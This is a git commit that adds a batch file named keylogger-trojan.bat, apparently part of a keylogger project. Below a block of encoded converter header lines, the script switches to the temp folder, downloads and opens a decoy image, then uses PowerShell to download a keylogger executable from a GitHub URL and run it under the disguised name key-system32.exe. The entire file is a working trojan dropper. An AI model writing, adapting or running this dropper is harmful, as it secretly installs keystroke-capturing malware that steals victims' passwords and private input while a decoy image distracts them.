73c9544c0f0af02f5b2e1f864cc43ed3d484454c
Mohammed Ragab Saad <103288444+MohammedRSaad@users.noreply.github.com>
2022-09-15 17:26:32 +0200

    Add files via upload

---
+++ launcher/keylogger-trojan.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCqDJHqI4UAjZA9RTQmRcGi1C6UZ/OHv5uWJsQFdVew7OILUyLHGYLte1wytSb4s1XEam8cZDidTewunYQgzrHx+umWQOcSUth3dTkec6F4kVmFxlGrXgmUyY9wI
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCqDJHqI4UAjZA9RTQmRcGi1C6UZ/OHv5uWJsQFdVew7OILUyLHGYLte1wytSb4s1XEam8cZDidTewunYQgzrHx+umWQOcSUth3dTkec6F4kW2FxlGrXgmU+eNYI
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/launcher/dounut%20design.png' -OutFile dounut-design.jpg"
+dounut-design.jpg
+Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key-system32.exe
+key-system32.exe
